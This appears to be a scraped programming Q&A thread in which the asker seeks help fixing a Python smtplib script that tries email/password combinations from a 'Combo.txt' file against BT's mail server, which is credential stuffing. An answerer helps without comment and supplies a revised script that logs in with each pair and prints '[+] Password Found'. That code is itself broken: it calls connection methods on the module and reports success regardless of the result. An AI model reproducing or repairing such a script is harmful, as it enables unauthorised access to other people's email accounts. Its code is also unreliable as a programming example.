<p>Here's my code. It checks a list of email/password combinations from a file to see if it is on a specific server (in my case BT). </p>
<p>But I am having trouble with the library names, I am not sure what to use. I checked on python docs but it wasn't clear enough, if someone can tell me as to what is incorrect I would deeply appreciate it.</p>
<p>Error received.
This will also give me errors for the other incorrect library names</p>
<pre><code>Traceback (most recent call last):
    File "main.py", line 3, in &lt;module&gt;

<p>For your problem I think the reason why as to your libraries are not working properly is because you're calling your imported library inconsistently:</p>
<p>e.g. sometimes you type 's.xxxxx', sometimes you type 'SMTPlib.xxxxx' for your module attributes, you should import smtplib as 's'. </p>
<p>So what does this is it stores the library in a short form named 's', so whenever you call a module or use a function from the library, you don't have to type the full '.smtplib' but instead just type a '.s' extension behind the specific function:</p>
<pre><code>import smtplib as s

smtpserver = s.connect("mail.btinternet.com", 465)
s.helo("mail.btinternet.com")
s.ehlo("mail.btinternet.com")

file = open("Combo.txt", "r") 

for line in file:
    x = line.split(":")
    user = x[0]
    password = x[1]

    s.login(user, password)
    print("[+] Password Found: %s" % password)

if s.SMTPAuthenticationError:
    print("Incorrect")
</code></pre>
<p>Should fix your problems now. remember to call functions from the specific library name in a consistent manner ('s').</p>

<span class="comment-copy">What's the problem?</span>
<span class="comment-copy">@SLaks I updated it.</span>
<span class="comment-copy">But the error message tells you everything, doesn't it? s is not defined,  which is obviously true looking at your code.</span>
<span class="comment-copy">@AndreasHeld I think I know that Sherlock, what I need to know is what the correct term is.</span>
<span class="comment-copy"><code>s = smtplib.SMTP()</code>, docs: <a href="https://docs.python.org/3/library/smtplib.html" rel="nofollow noreferrer">smtplib</a></span>
